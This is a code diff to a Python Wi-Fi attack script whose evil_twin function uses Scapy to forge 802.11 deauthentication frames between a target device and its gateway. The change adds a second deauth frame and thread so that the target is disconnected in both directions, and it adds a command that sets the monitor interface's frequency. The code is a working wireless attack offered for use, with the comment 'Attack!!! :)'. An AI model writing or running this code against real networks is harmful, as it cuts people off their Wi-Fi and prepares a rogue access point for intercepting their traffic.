@@ -94,10 +94,16 @@ def evil_twin():
     # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
     print('The target is: ', target_mac)
     print('Attack!!! :)')
-    frame = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
-    deauth1 = threading.Thread(target=for_ap, args=(frame, interface))
+    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
+    frame2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
+
+    deauth1 = threading.Thread(target=for_ap, args=(frame1, interface))
+    deauth2 = threading.Thread(target=for_ap, args=(frame2, interface))
+
     deauth1.start()
+    deauth2.start()
     deauth1.join()
+    deauth2.join()
 
     # 14. Disable monitor mode and cancel interface division
     disable_monitor_mode(interface)
@@ -143,6 +149,7 @@ if __name__ == "__main__":
                 interface = interfaces[choose - 1]
                 enable_monitor_mode(interface)
                 os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
+                os.system(f"sudo iwconfig mon0 freq 2.484G")
                 os.system(f"sudo ifconfig mon0 up")
                 break
             except:
